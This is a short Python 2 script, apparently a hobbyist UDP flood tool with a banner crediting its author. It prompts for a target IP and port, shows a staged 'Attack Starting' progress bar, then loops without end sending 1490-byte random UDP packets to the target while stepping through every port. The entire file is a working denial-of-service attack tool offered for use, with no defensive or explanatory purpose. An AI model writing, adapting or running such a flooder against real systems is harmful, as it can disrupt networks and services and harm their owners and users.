import sys
import os
import time
import socket
import random
import os
import sys
os.system("clear")
#CLAVEU
on_green="\033[42m"       # Green
blue="\033[0;34m"         # Blue
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system('figlet -f small X0N4Y3M | lolcat')
print(on_green+'\n\t[Aurthor]-SABBIR AHMED')
print(blue+'========================================================')
ip = raw_input("IP TARGET  : ")
port = input("PORT        : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[1;32mSent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

